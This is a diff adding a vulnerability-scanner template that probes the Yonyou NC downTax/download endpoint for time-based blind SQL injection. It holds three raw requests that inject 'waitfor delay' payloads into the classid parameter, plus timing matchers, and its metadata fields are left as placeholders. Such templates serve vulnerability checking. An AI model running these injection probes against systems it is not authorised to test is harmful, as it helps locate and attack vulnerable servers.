@@ -1,0 +1,42 @@
+id: yonyou-nc-download-sqli
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: 用友NC downTaxdownload SQL注入漏洞复现
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        GET /portal/pt/downTax/download?pageId=login&classid=1'waitfor+delay+'0:0:3'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+      - |-
+        GET /portal/pt/downTax/download?pageId=login&classid=1'waitfor+delay+'0:0:6'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+      - |-
+        GET /portal/pt/downTax/download?pageId=login&classid=1'waitfor+delay+'0:0:9'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
